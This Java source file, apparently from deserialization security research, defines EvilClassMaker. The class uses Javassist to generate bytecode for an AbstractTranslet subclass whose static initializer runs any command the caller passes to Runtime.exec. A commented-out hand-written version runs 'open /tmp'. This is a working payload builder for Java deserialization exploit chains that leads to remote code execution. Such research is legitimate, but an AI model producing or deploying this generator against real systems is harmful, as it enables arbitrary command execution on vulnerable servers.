package util;

import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;
import javassist.CtMethod;

/*
*
package util;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

public class EvilByteCodes extends AbstractTranslet {

    static {
        try {
            Runtime.getRuntime().exec("open /tmp");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}

* */

public class EvilClassMaker {
    public static byte[] getGenerate(String cName, String cmd) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.makeClass(cName);

        CtClass sClass = pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
        ctClass.setSuperclass(sClass);
        CtConstructor constructor = ctClass.makeClassInitializer();
        constructor.setBody("Runtime.getRuntime().exec(\"" + cmd + "\");");
//        ctClass.addMethod(CtMethod.make("public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers){}", ctClass));
//        ctClass.addMethod(CtMethod.make("public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM document, com.sun.org.apache.xml.internal.dtm.DTMAxisIterator iterator, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers){}", ctClass));
        byte[] code = ctClass.toBytecode();
        ctClass.defrost();
        return code;
    }
}
